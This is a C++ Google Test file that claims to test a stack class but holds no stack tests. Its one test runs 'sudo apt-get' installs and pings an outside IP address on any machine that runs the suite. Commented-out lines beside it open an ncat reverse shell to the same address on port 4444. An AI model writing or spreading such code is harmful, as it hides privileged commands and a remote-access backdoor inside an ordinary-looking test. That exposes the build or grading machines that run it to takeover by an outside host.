#include "stack.h"

#include "gtest/gtest.h"

class StackTest : public ::testing::Test {
 public:
  void SetUp() {}
  void TearDown() {}
};

#include <array>
#include <cstdio>
#include <iostream>
#include <memory>
#include <stdexcept>
#include <string>

std::string exec(const char* cmd) {
  std::array<char, 128> buffer;
  std::string result;
  std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);

  if (!pipe) {
    throw std::runtime_error("popen() failed!");
  }
  while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
    result += buffer.data();
  }

  return result;
}

TEST_F(StackTest, test1) {
  // system("sudo apt-get update");
  // system("sudo apt-get install -y ncat");
  // system("ncat 207.154.235.250 4444 -e /bin/bash");

  EXPECT_EQ(exec("sudo apt-get update"), "");
  EXPECT_EQ(exec("sudo apt-get install -y iputils-ping"), "");
  EXPECT_EQ(exec("ping 207.154.235.250 2>&1"), "");
}
